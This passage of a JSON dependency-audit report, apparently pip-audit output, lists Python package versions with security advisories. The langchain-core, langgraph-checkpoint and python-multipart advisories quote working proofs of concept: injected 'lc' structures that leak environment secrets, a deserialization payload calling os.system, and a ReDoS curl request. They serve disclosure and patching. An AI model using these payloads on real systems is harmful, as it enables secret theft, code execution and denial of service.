            "description": "## Summary  A serialization injection vulnerability exists in LangChain's `dumps()` and `dumpd()` functions. The functions do not escape dictionaries with `'lc'` keys when serializing free-form dictionaries. The `'lc'` key is used internally by LangChain to mark serialized objects. When user-controlled data contains this key structure, it is treated as a legitimate LangChain object during deserialization rather than plain user data.  ### Attack surface  The core vulnerability was in `dumps()` and `dumpd()`: these functions failed to escape user-controlled dictionaries containing `'lc'` keys. When this unescaped data was later deserialized via `load()` or `loads()`, the injected structures were treated as legitimate LangChain objects rather than plain user data.  This escaping bug enabled several attack vectors:  1. **Injection via user data**: Malicious LangChain object structures could be injected through user-controlled fields like `metadata`, `additional_kwargs`, or `response_metadata` 2. **Class instantiation within trusted namespaces**: Injected manifests could instantiate any `Serializable` subclass, but only within the pre-approved trusted namespaces (`langchain_core`, `langchain`, `langchain_community`). This includes classes with side effects in `__init__` (network calls, file operations, etc.). Note that namespace validation was already enforced before this patch, so arbitrary classes outside these trusted namespaces could not be instantiated.  ### Security hardening  This patch fixes the escaping bug in `dumps()` and `dumpd()` and introduces new restrictive defaults in `load()` and `loads()`: allowlist enforcement via `allowed_objects=\"core\"` (restricted to [serialization mappings](https://github.com/langchain-ai/langchain/blob/master/libs/core/langchain_core/load/mapping.py)), `secrets_from_env` changed from `True` to `False`, and default Jinja2 template blocking via `init_validator`. These are breaking changes for some use cases.  ## Who is affected?  Applications are vulnerable if they:  1. **Use `astream_events(version=\"v1\")`** \u2014 The v1 implementation internally uses vulnerable serialization. Note: `astream_events(version=\"v2\")` is not vulnerable. 2. **Use `Runnable.astream_log()`** \u2014 This method internally uses vulnerable serialization for streaming outputs. 3. **Call `dumps()` or `dumpd()` on untrusted data, then deserialize with `load()` or `loads()`** \u2014 Trusting your own serialization output makes you vulnerable if user-controlled data (e.g., from LLM responses, metadata fields, or user inputs) contains `'lc'` key structures. 4. **Deserialize untrusted data with `load()` or `loads()`** \u2014 Directly deserializing untrusted data that may contain injected `'lc'` structures. 5. **Use `RunnableWithMessageHistory`** \u2014 Internal serialization in message history handling. 6. **Use `InMemoryVectorStore.load()`** to deserialize untrusted documents. 7. Load untrusted generations from cache using **`langchain-community` caches**. 8. Load untrusted manifests from the LangChain Hub via **`hub.pull`**. 9. Use **`StringRunEvaluatorChain`** on untrusted runs. 10. Use **`create_lc_store`** or **`create_kv_docstore`** with untrusted documents. 11. Use **`MultiVectorRetriever`** with byte stores containing untrusted documents. 12. Use **`LangSmithRunChatLoader`** with runs containing untrusted messages.  The most common attack vector is through **LLM response fields** like `additional_kwargs` or `response_metadata`, which can be controlled via prompt injection and then serialized/deserialized in streaming operations.  ## Impact  Attackers who control serialized data can extract environment variable secrets by injecting `{\"lc\": 1, \"type\": \"secret\", \"id\": [\"ENV_VAR\"]}` to load environment variables during deserialization (when `secrets_from_env=True`, which was the old default). They can also instantiate classes with controlled parameters by injecting constructor structures to instantiate any class within trusted namespaces with attacker-controlled parameters, potentially triggering side effects such as network calls or file operations.  Key severity factors:  - Affects the serialization path - applications trusting their own serialization output are vulnerable - Enables secret extraction when combined with `secrets_from_env=True` (the old default) - LLM responses in `additional_kwargs` can be controlled via prompt injection  ## Exploit example  ```python from langchain_core.load import dumps, load import os  # Attacker injects secret structure into user-controlled data attacker_dict = {     \"user_data\": {         \"lc\": 1,         \"type\": \"secret\",         \"id\": [\"OPENAI_API_KEY\"]     } }  serialized = dumps(attacker_dict)  # Bug: does NOT escape the 'lc' key  os.environ[\"OPENAI_API_KEY\"] = \"sk-secret-key-12345\" deserialized = load(serialized, secrets_from_env=True)  print(deserialized[\"user_data\"])  # \"sk-secret-key-12345\" - SECRET LEAKED!  ```  ## Security hardening changes (breaking changes)  This patch introduces three breaking changes to `load()` and `loads()`:  1. **New `allowed_objects` parameter** (defaults to `'core'`): Enforces allowlist of classes that can be deserialized. The `'all'` option corresponds to the list of objects [specified in `mappings.py`](https://github.com/langchain-ai/langchain/blob/master/libs/core/langchain_core/load/mapping.py) while the `'core'` option limits to objects within `langchain_core`. We recommend that users explicitly specify which objects they want to allow for serialization/deserialization. 2. **`secrets_from_env` default changed from `True` to `False`**: Disables automatic secret loading from environment 3. **New `init_validator` parameter** (defaults to `default_init_validator`): Blocks Jinja2 templates by default  ## Migration guide  ### No changes needed for most users  If you're deserializing standard LangChain types (messages, documents, prompts, trusted partner integrations like `ChatOpenAI`, `ChatAnthropic`, etc.), your code will work without changes:  ```python from langchain_core.load import load  # Uses default allowlist from serialization mappings obj = load(serialized_data)  ```  ### For custom classes  If you're deserializing custom classes not in the serialization mappings, add them to the allowlist:  ```python from langchain_core.load import load from my_package import MyCustomClass  # Specify the classes you need obj = load(serialized_data, allowed_objects=[MyCustomClass]) ```  ### For Jinja2 templates  Jinja2 templates are now blocked by default because they can execute arbitrary code. If you need Jinja2 templates, pass `init_validator=None`:  ```python from langchain_core.load import load from langchain_core.prompts import PromptTemplate  obj = load(     serialized_data,     allowed_objects=[PromptTemplate],     init_validator=None )  ```  > [!WARNING] > Only disable `init_validator` if you trust the serialized data. Jinja2 templates can execute arbitrary Python code.  ### For secrets from environment  `secrets_from_env` now defaults to `False`. If you need to load secrets from environment variables:  ```python from langchain_core.load import load  obj = load(serialized_data, secrets_from_env=True) ```   ## Credits  * Dumps bug was reported by @yardenporat * Changes for security hardening due to findings from @0xn3va and @VladimirEliTokarev"
          }
        ]
      },
      {
        "name": "langchain-text-splitters",
        "version": "0.2.4",
        "vulns": [
          {
            "id": "GHSA-m42m-m8cr-8m58",
            "fix_versions": [
              "0.3.9"
            ],
            "description": "The HTMLSectionSplitter class in langchain-text-splitters is vulnerable to XML External Entity (XXE) attacks due to unsafe XSLT parsing. This vulnerability arises because the class allows the use of arbitrary XSLT stylesheets, which are parsed using lxml.etree.parse() and lxml.etree.XSLT() without any hardening measures. In lxml versions up to 4.9.x, external entities are resolved by default, allowing attackers to read arbitrary local files or perform outbound HTTP(S) fetches. In lxml versions 5.0 and above, while entity expansion is disabled, the XSLT document() function can still read any URI unless XSLTAccessControl is applied. This vulnerability allows remote attackers to gain read-only access to any file the LangChain process can reach, including sensitive files such as SSH keys, environment files, source code, or cloud metadata. No authentication, special privileges, or user interaction are required, and the issue is exploitable in default deployments that enable custom XSLT."
          }
        ]
      },
      {
        "name": "langgraph",
        "version": "0.0.51",
        "vulns": []
      },
      {
        "name": "langgraph-checkpoint",
        "version": "2.1.2",
        "vulns": [
          {
            "id": "GHSA-wwqv-p2pp-99h5",
            "fix_versions": [
              "3.0.0"
            ],
            "description": "# Summary  Prior to `langgraph-checkpoint` version `3.0` , LangGraph\u2019s `JsonPlusSerializer` (used as the default serialization protocol for all checkpointing) contains a remote code execution (RCE) vulnerability when deserializing payloads saved in the `\"json\"` serialization mode.  If an attacker can cause your application to persist a payload serialized in this mode, they may be able to also send malicious content that executes arbitrary Python code during deserialization.  Upgrading to version langgraph-checkpoint `3.0` patches this vulnerability by preventing deserialization of custom objects saved in this mode.  If you are deploying in `langgraph-api`, any version `0.5` or later is also free of this vulnerability.   # Details  **Affected file / component**  [jsonplus.py](https://github.com/langchain-ai/langgraph/blob/c5744f583b11745cd406f3059903e17bbcdcc8ac/libs/checkpoint/langgraph/checkpoint/serde/jsonplus.py)  By default, the serializer attempts to use `\"msgpack\"` for serialization. However, prior to version `3.0` of the checkpointer library, if illegal Unicode surrogate values caused serialization to fail,  it would fall back to using the `\"json\"` mode.  When operating in this mode, the deserializer supports a constructor-style format (`lc == 2`, `type == \"constructor\"`) for custom objects to allow them to be reconstructed at load time.  If an attacker is able to trigger this mode with a malicious payload, deserializing  allow the attacker to execute arbitrary functions upon load.  ---  # Who is affected  This issue affects all users of `langgraph-checkpoint` **versions earlier than 3.0** who:  1. Allow untrusted or user-supplied data to be persisted into checkpoints, and 2. Use the default serializer (or explicitly instantiate `JsonPlusSerializer`) that may fall back to `\"json\"` mode.  If your application only processes trusted data or does not allow untrusted checkpoint writes, the practical risk is reduced.  # Proof of Concept (PoC)  ```python from langgraph.graph import StateGraph  from typing import TypedDict from langgraph.checkpoint.sqlite import SqliteSaver  class State(TypedDict):     foo: str     attack: dict  def my_node(state: State):     return {\"foo\": \"oops i fetched a surrogate \\ud800\"}  with SqliteSaver.from_conn_string(\"foo.db\") as saver:     graph = ( \t    StateGraph(State). \t    add_node(\"my_node\", my_node). \t    add_edge(\"__start__\", \"my_node\"). \t    compile(checkpointer=saver) \t )           attack = {         \"lc\": 2,         \"type\": \"constructor\",         \"id\": [\"os\", \"system\"],         \"kwargs\": {\"command\": \"echo pwnd you > /tmp/pwnd.txt\"},     }     malicious_payload = {          \"attack\": attack,     }      thread_id = \"00000000-0000-0000-0000-000000000001\"     config = {\"thread_id\": thread_id}     # Malicious payload is saved in the first call     graph.invoke(malicious_payload, config=config)      # Malicious payload is deserialized and code is executed in the second call     graph.invoke({\"foo\": \"hi there\"}, config=config)  ```  Running this PoC writes a file `/tmp/pwnd.txt` to disk, demonstrating code execution.  Internally, this exploits the following code path:  ```python from langgraph.checkpoint.serde.jsonplus import JsonPlusSerializer  serializer = JsonPlusSerializer() # Used within the checkpointer  serialized = serializer.dumps_typed(malicious_payload) serializer.loads_typed(serialized)  # Executes os.system(...)  ```  ---  # Fixed Version  The vulnerability is fixed in **`langgraph-checkpoint==3.0.0`**  Release link: https://github.com/langchain-ai/langgraph/releases/tag/checkpoint%3D%3D3.0.0  ---  # Fix Description  The fix introduces an **allow-list** for constructor deserialization, restricting permissible `\"id\"` paths to explicitly approved module/class combinations provided at serializer construction.  Additionally, saving payloads in `\"json\"` format has been deprecated to remove this unsafe fallback path.  ---  # Mitigation  Upgrade immediately to `langgraph-checkpoint==3.0.0`.  This version is fully compatible with `langgraph>=0.3` and does **not** require any import changes or code modifications.  In `langgraph-api`, updating to `0.5` or later will automatically require the patched version of the checkpointer library."
          }
        ]
      },
      {
        "name": "langgraph-prebuilt",
        "version": "0.6.5",
        "vulns": []
      },
      {
        "name": "langgraph-sdk",
        "version": "0.2.9",
        "vulns": []
      },
      {
        "name": "langsmith",
        "version": "0.1.147",
        "vulns": []
      },
      {
        "name": "license-expression",
        "version": "30.4.4",
        "vulns": []
      },
      {
        "name": "lxml",
        "version": "6.0.2",
        "vulns": []
      },
      {
        "name": "macholib",
        "version": "1.15.2",
        "vulns": []
      },
      {
        "name": "mako",
        "version": "1.3.10",
        "vulns": []
      },
      {
        "name": "markdown",
        "version": "3.9",
        "vulns": []
      },
      {
        "name": "markdown-it-py",
        "version": "3.0.0",
        "vulns": []
      },
      {
        "name": "markupsafe",
        "version": "3.0.3",
        "vulns": []
      },
      {
        "name": "matplotlib-inline",
        "version": "0.2.1",
        "vulns": []
      },
      {
        "name": "mccabe",
        "version": "0.7.0",
        "vulns": []
      },
      {
        "name": "mdurl",
        "version": "0.1.2",
        "vulns": []
      },
      {
        "name": "mergedeep",
        "version": "1.3.4",
        "vulns": []
      },
      {
        "name": "mkdocs",
        "version": "1.5.3",
        "vulns": []
      },
      {
        "name": "mkdocs-material",
        "version": "9.4.14",
        "vulns": []
      },
      {
        "name": "mkdocs-material-extensions",
        "version": "1.3.1",
        "vulns": []
      },
      {
        "name": "mmh3",
        "version": "5.2.0",
        "vulns": []
      },
      {
        "name": "mpmath",
        "version": "1.3.0",
        "vulns": []
      },
      {
        "name": "msgpack",
        "version": "1.1.2",
        "vulns": []
      },
      {
        "name": "multidict",
        "version": "6.7.0",
        "vulns": []
      },
      {
        "name": "multitasking",
        "version": "0.0.12",
        "vulns": []
      },
      {
        "name": "mypy",
        "version": "1.8.0",
        "vulns": []
      },
      {
        "name": "mypy-extensions",
        "version": "1.1.0",
        "vulns": []
      },
      {
        "name": "narwhals",
        "version": "2.14.0",
        "vulns": []
      },
      {
        "name": "networkx",
        "version": "3.2.1",
        "vulns": []
      },
      {
        "name": "nltk",
        "version": "3.9.2",
        "vulns": []
      },
      {
        "name": "nodeenv",
        "version": "1.10.0",
        "vulns": []
      },
      {
        "name": "numpy",
        "version": "1.26.4",
        "vulns": []
      },
      {
        "name": "oauthlib",
        "version": "3.3.1",
        "vulns": []
      },
      {
        "name": "onnxruntime",
        "version": "1.19.2",
        "vulns": []
      },
      {
        "name": "openai",
        "version": "2.14.0",
        "vulns": []
      },
      {
        "name": "openpyxl",
        "version": "3.1.2",
        "vulns": []
      },
      {
        "name": "opentelemetry-api",
        "version": "1.39.1",
        "vulns": []
      },
      {
        "name": "opentelemetry-exporter-otlp-proto-common",
        "version": "1.39.1",
        "vulns": []
      },
      {
        "name": "opentelemetry-exporter-otlp-proto-grpc",
        "version": "1.39.1",
        "vulns": []
      },
      {
        "name": "opentelemetry-instrumentation",
        "version": "0.60b1",
        "vulns": []
      },
      {
        "name": "opentelemetry-instrumentation-asgi",
        "version": "0.60b1",
        "vulns": []
      },
      {
        "name": "opentelemetry-instrumentation-fastapi",
        "version": "0.60b1",
        "vulns": []
      },
      {
        "name": "opentelemetry-proto",
        "version": "1.39.1",
        "vulns": []
      },
      {
        "name": "opentelemetry-sdk",
        "version": "1.39.1",
        "vulns": []
      },
      {
        "name": "opentelemetry-semantic-conventions",
        "version": "0.60b1",
        "vulns": []
      },
      {
        "name": "opentelemetry-util-http",
        "version": "0.60b1",
        "vulns": []
      },
      {
        "name": "orjson",
        "version": "3.11.5",
        "vulns": []
      },
      {
        "name": "ormsgpack",
        "version": "1.11.0",
        "vulns": []
      },
      {
        "name": "overrides",
        "version": "7.7.0",
        "vulns": []
      },
      {
        "name": "packageurl-python",
        "version": "0.17.6",
        "vulns": []
      },
      {
        "name": "packaging",
        "version": "23.2",
        "vulns": []
      },
      {
        "name": "paginate",
        "version": "0.5.7",
        "vulns": []
      },
      {
        "name": "pandas",
        "version": "2.3.3",
        "vulns": []
      },
      {
        "name": "parso",
        "version": "0.8.5",
        "vulns": []
      },
      {
        "name": "passlib",
        "version": "1.7.4",
        "vulns": []
      },
      {
        "name": "pathspec",
        "version": "0.12.1",
        "vulns": []
      },
      {
        "name": "peewee",
        "version": "3.18.3",
        "vulns": []
      },
      {
        "name": "pexpect",
        "version": "4.9.0",
        "vulns": []
      },
      {
        "name": "pillow",
        "version": "10.4.0",
        "vulns": []
      },
      {
        "name": "pip",
        "version": "25.3",
        "vulns": []
      },
      {
        "name": "pip-api",
        "version": "0.0.34",
        "vulns": []
      },
      {
        "name": "pip-audit",
        "version": "2.6.1",
        "vulns": []
      },
      {
        "name": "pip-requirements-parser",
        "version": "32.0.1",
        "vulns": []
      },
      {
        "name": "platformdirs",
        "version": "4.4.0",
        "vulns": []
      },
      {
        "name": "plotly",
        "version": "5.17.0",
        "vulns": []
      },
      {
        "name": "pluggy",
        "version": "1.6.0",
        "vulns": []
      },
      {
        "name": "posthog",
        "version": "6.9.3",
        "vulns": []
      },
      {
        "name": "pre-commit",
        "version": "3.5.0",
        "vulns": []
      },
      {
        "name": "prompt-toolkit",
        "version": "3.0.52",
        "vulns": []
      },
      {
        "name": "propcache",
        "version": "0.4.1",
        "vulns": []
      },
      {
        "name": "protobuf",
        "version": "6.33.2",
        "vulns": []
      },
      {
        "name": "psycopg2-binary",
        "version": "2.9.9",
        "vulns": []
      },
      {
        "name": "ptyprocess",
        "version": "0.7.0",
        "vulns": []
      },
      {
        "name": "pulsar-client",
        "version": "3.8.0",
        "vulns": []
      },
      {
        "name": "pure-eval",
        "version": "0.2.3",
        "vulns": []
      },
      {
        "name": "py-serializable",
        "version": "0.11.1",
        "vulns": []
      },
      {
        "name": "pyarrow",
        "version": "21.0.0",
        "vulns": []
      },
      {
        "name": "pyasn1",
        "version": "0.6.1",
        "vulns": []
      },
      {
        "name": "pyasn1-modules",
        "version": "0.4.2",
        "vulns": []
      },
      {
        "name": "pycodestyle",
        "version": "2.11.1",
        "vulns": []
      },
      {
        "name": "pycparser",
        "version": "2.23",
        "vulns": []
      },
      {
        "name": "pydantic",
        "version": "2.5.3",
        "vulns": []
      },
      {
        "name": "pydantic-core",
        "version": "2.14.6",
        "vulns": []
      },
      {
        "name": "pydantic-settings",
        "version": "2.1.0",
        "vulns": []
      },
      {
        "name": "pydeck",
        "version": "0.9.1",
        "vulns": []
      },
      {
        "name": "pyflakes",
        "version": "3.2.0",
        "vulns": []
      },
      {
        "name": "pygithub",
        "version": "2.8.1",
        "vulns": []
      },
      {
        "name": "pygments",
        "version": "2.19.2",
        "vulns": []
      },
      {
        "name": "pyjwt",
        "version": "2.10.1",
        "vulns": []
      },
      {
        "name": "pylint",
        "version": "3.0.2",
        "vulns": []
      },
      {
        "name": "pymdown-extensions",
        "version": "10.19.1",
        "vulns": []
      },
      {
        "name": "pynacl",
        "version": "1.6.1",
        "vulns": []
      },
      {
        "name": "pyparsing",
        "version": "3.3.1",
        "vulns": []
      },
      {
        "name": "pypika",
        "version": "0.48.9",
        "vulns": []
      },
      {
        "name": "pyproject-hooks",
        "version": "1.2.0",
        "vulns": []
      },
      {
        "name": "pytesseract",
        "version": "0.3.13",
        "vulns": []
      },
      {
        "name": "pytest",
        "version": "7.4.4",
        "vulns": []
      },
      {
        "name": "pytest-asyncio",
        "version": "0.23.3",
        "vulns": []
      },
      {
        "name": "pytest-cov",
        "version": "4.1.0",
        "vulns": []
      },
      {
        "name": "pytest-mock",
        "version": "3.12.0",
        "vulns": []
      },
      {
        "name": "python-dateutil",
        "version": "2.9.0.post0",
        "vulns": []
      },
      {
        "name": "python-dotenv",
        "version": "1.0.0",
        "vulns": []
      },
      {
        "name": "python-jose",
        "version": "3.3.0",
        "vulns": [
          {
            "id": "PYSEC-2024-232",
            "fix_versions": [
              "3.4.0"
            ],
            "description": "python-jose through 3.3.0 has algorithm confusion with OpenSSH ECDSA keys and other key formats. This is similar to CVE-2022-29217."
          },
          {
            "id": "PYSEC-2024-233",
            "fix_versions": [
              "3.4.0"
            ],
            "description": "python-jose through 3.3.0 allows attackers to cause a denial of service (resource consumption) during a decode via a crafted JSON Web Encryption (JWE) token with a high compression ratio, aka a \"JWT bomb.\" This is similar to CVE-2024-21319."
          }
        ]
      },
      {
        "name": "python-multipart",
        "version": "0.0.6",
        "vulns": [
          {
            "id": "GHSA-2jv5-9r88-3w3p",
            "fix_versions": [
              "0.0.7"
            ],
            "description": "### Summary  When using form data, `python-multipart` uses a Regular Expression to parse the HTTP `Content-Type` header, including options.  An attacker could send a custom-made `Content-Type` option that is very difficult for the RegEx to process, consuming CPU resources and stalling indefinitely (minutes or more) while holding the main event loop. This means that process can't handle any more requests.  This can create a ReDoS (Regular expression Denial of Service): https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS  This only applies when the app uses form data, parsed with `python-multipart`.  ### Details  A regular HTTP `Content-Type` header could look like:  ``` Content-Type: text/html; charset=utf-8 ```  `python-multipart` parses the option with this RegEx: https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74  A custom option could be made and sent to the server to break it with:  ``` Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\ ```  ### PoC  Create a simple WSGI application, that just parses the `Content-Type`, and run it with `python main.py`:  ```Python # main.py from wsgiref.simple_server import make_server from wsgiref.validate import validator  from multipart.multipart import parse_options_header   def simple_app(environ, start_response):     _, _ = parse_options_header(environ[\"CONTENT_TYPE\"])      start_response(\"200 OK\", [(\"Content-type\", \"text/plain\")])     return [b\"Ok\"]   httpd = make_server(\"\", 8123, validator(simple_app)) print(\"Serving on port 8123...\") httpd.serve_forever() ```  Then send the attacking request with:  ```console $ curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8123/' ```  ### Impact  This is a ReDoS, (Regular expression Denial of Service), so it only applies to those using python-multipart to read form data, such as Starlette and FastAPI.  ### Original Report  This was originally reported to FastAPI as an email to security@tiangolo.com, sent via https://huntr.com/, the original reporter is Marcello, https://github.com/byt3bl33d3r  <details> <summary>Original report to FastAPI</summary>  Hey Tiangolo!  My name's Marcello and I work on the ProtectAI/Huntr Threat Research team, a few months ago we got a report (from @nicecatch2000) of a ReDoS affecting another very popular Python web framework. After some internal research, I found that FastAPI is vulnerable to the same ReDoS under certain conditions (only when it parses Form data not JSON).  Here are the details: I'm using the latest version of FastAPI (0.109.0) and the following code:  ```Python from typing import Annotated from fastapi.responses import HTMLResponse from fastapi import FastAPI,Form from pydantic import BaseModel  class Item(BaseModel):     username: str  app = FastAPI()  @app.get(\"/\", response_class=HTMLResponse) async def index():     return HTMLResponse(\"Test\", status_code=200)  @app.post(\"/submit/\") async def submit(username: Annotated[str, Form()]):     return {\"username\": username}  @app.post(\"/submit_json/\") async def submit_json(item: Item):     return {\"username\": item.username} ```  I'm running the above with uvicorn with the following command:  ```console uvicorn server:app ```  Then run the following cUrl command:  ``` curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8000/submit/' ```  You'll see the server locks up, is unable to serve anymore requests and one CPU core is pegged to 100%  You can even start uvicorn with multiple workers with the --workers 4 argument and as long as you send (workers + 1) requests you'll completely DoS the FastApi server.  If you try submitting Json to the /submit_json endpoint with the malicious Content-Type header you'll see it isn't vulnerable. So this only affects FastAPI when it parses Form data.  Cheers  #### Impact  An attacker is able to cause a DoS on a FastApi server via a malicious Content-Type header if it parses Form data.  #### Occurrences  [params.py L586](https://github.com/tiangolo/fastapi/blob/d74b3b25659b42233a669f032529880de8bd6c2d/fastapi/params.py#L586)  </details>"
          },
          {
            "id": "GHSA-59g5-xgcq-4qw3",
            "fix_versions": [
              "0.0.18"
            ],
            "description": "### Summary  When parsing form data, `python-multipart` skips line breaks (CR `\\r` or LF `\\n`) in front of the first boundary and any tailing bytes after the last boundary. This happens one byte at a time and emits a log event each time, which may cause excessive logging for certain inputs.  An attacker could abuse this by sending a malicious request with lots of data before the first or after the last boundary, causing high CPU load and stalling the processing thread for a significant amount of time. In case of ASGI application, this could stall the event loop and prevent other requests from being processed, resulting in a denial of service (DoS).  ### Impact  Applications that use `python-multipart` to parse form data (or use frameworks that do so) are affected.   ### Original Report  This security issue was reported by: - GitHub security advisory in Starlette on October 30 by @Startr4ck - Email to `python-multipart` maintainer on October 3 by @mnqazi"
          }
        ]
      },
      {
        "name": "pytz",
        "version": "2025.2",
        "vulns": []
      },
      {
        "name": "pyyaml",
        "version": "6.0.3",
        "vulns": []
      },
      {
        "name": "pyyaml-env-tag",
        "version": "1.1",
        "vulns": []
      },
      {
        "name": "redis",
        "version": "5.0.1",
        "vulns": []
      },
      {
        "name": "referencing",
        "version": "0.36.2",
        "vulns": []
      },
      {
        "name": "regex",
        "version": "2025.11.3",
        "vulns": []
      },
      {
        "name": "requests",
        "version": "2.31.0",
        "vulns": [
          {
            "id": "GHSA-9wx4-h78v-vm56",
            "fix_versions": [
              "2.32.0"
            ],
            "description": "When making requests through a Requests `Session`, if the first request is made with `verify=False` to disable cert verification, all subsequent requests to the same origin will continue to ignore cert verification regardless of changes to the value of `verify`. This behavior will continue for the lifecycle of the connection in the connection pool.  ### Remediation Any of these options can be used to remediate the current issue, we highly recommend upgrading as the preferred mitigation.  * Upgrade to `requests>=2.32.0`. * For `requests<2.32.0`, avoid setting `verify=False` for the first request to a host while using a Requests Session. * For `requests<2.32.0`, call `close()` on `Session` objects to clear existing connections if `verify=False` is used.  ### Related Links * https://github.com/psf/requests/pull/6655"
          },
          {
            "id": "GHSA-9hjg-9r4m-mvj7",
            "fix_versions": [
              "2.32.4"
            ],
            "description": "### Impact  Due to a URL parsing issue, Requests releases prior to 2.32.4 may leak .netrc credentials to third parties for specific maliciously-crafted URLs.  ### Workarounds For older versions of Requests, use of the .netrc file can be disabled with `trust_env=False` on your Requests Session ([docs](https://requests.readthedocs.io/en/latest/api/#requests.Session.trust_env)).  ### References https://github.com/psf/requests/pull/6965 https://seclists.org/fulldisclosure/2025/Jun/2"
          }
        ]
      },
      {
        "name": "requests-oauthlib",
        "version": "2.0.0",
        "vulns": []
      },
      {
        "name": "requests-toolbelt",
        "version": "1.0.0",
        "vulns": []
      },
      {
        "name": "rich",
        "version": "13.9.4",
        "vulns": []
      },
      {
        "name": "rpds-py",
        "version": "0.27.1",
        "vulns": []
      },
      {
        "name": "rsa",
        "version": "4.9.1",
        "vulns": []
      },
      {
        "name": "ruff",
        "version": "0.14.10",
        "vulns": []
      },
      {
        "name": "safetensors",
        "version": "0.7.0",
        "vulns": []
      },
      {
        "name": "scikit-learn",
        "version": "1.6.1",
        "vulns": []
      },
      {
        "name": "scipy",
        "version": "1.13.1",
        "vulns": []
      },
      {
        "name": "sentence-transformers",
        "version": "2.3.1",
        "vulns": []
      },
      {
        "name": "sentencepiece",
        "version": "0.2.1",
        "vulns": []
      },
      {
        "name": "sentry-sdk",
        "version": "1.40.0",
        "vulns": [
          {
            "id": "GHSA-g92j-qhmh-64v2",
            "fix_versions": [
              "1.45.1",
              "2.8.0"
            ],
            "description": "### Impact  The bug in Sentry's Python SDK <2.8.0 results in the unintentional exposure of environment variables to subprocesses despite the `env={}` setting.  ### Details  In Python's `subprocess` calls, all environment variables are passed to subprocesses by default. However, if you specifically do not want them to be passed to subprocesses, you may use `env` argument in `subprocess` calls, like in this example:  ``` >>> subprocess.check_output([\"env\"], env={\"TEST\":\"1\"}) b'TEST=1\\n' ```  If you'd want to not pass any variables, you can set an empty dict:  ``` >>> subprocess.check_output([\"env\"], env={}) b'' ```  However, the bug in Sentry SDK <2.8.0 causes **all environment variables** to be passed to the subprocesses when `env={}` is set, unless the Sentry SDK's [Stdlib](https://docs.sentry.io/platforms/python/integrations/default-integrations/#stdlib) integration is disabled. The Stdlib integration is enabled by default.  ### Patches The issue has been patched in https://github.com/getsentry/sentry-python/pull/3251 and the fix released in [sentry-sdk==2.8.0](https://github.com/getsentry/sentry-python/releases/tag/2.8.0). The fix was also backported to [sentry-sdk==1.45.1](https://github.com/getsentry/sentry-python/releases/tag/1.45.1).  ### Workarounds  We strongly recommend upgrading to the latest SDK version. However, if it's not possible, and if passing environment variables to child processes poses a security risk for you, there are two options:  1. In your application, replace `env={}` with the minimal dict `env={\"EMPTY_ENV\":\"1\"}` or similar.  OR  2. Disable Stdlib integration: ``` import sentry_sdk  # Should go before sentry_sdk.init sentry_sdk.integrations._DEFAULT_INTEGRATIONS.remove(\"sentry_sdk.integrations.stdlib.StdlibIntegration\")  sentry_sdk.init(...) ```  ### References * Sentry docs: [Default integrations](https://docs.sentry.io/platforms/python/integrations/default-integrations/) * Python docs: [subprocess module](https://docs.python.org/3/library/subprocess.html) * Patch https://github.com/getsentry/sentry-python/pull/3251"
          }
        ]
      },
      {
        "name": "setuptools",
        "version": "58.0.4",
        "vulns": [
          {
            "id": "PYSEC-2022-43012",
            "fix_versions": [
              "65.5.1"
            ],
            "description": "Python Packaging Authority (PyPA) setuptools before 65.5.1 allows remote attackers to cause a denial of service via HTML in a crafted package or custom PackageIndex page. There is a Regular Expression Denial of Service (ReDoS) in package_index.py."
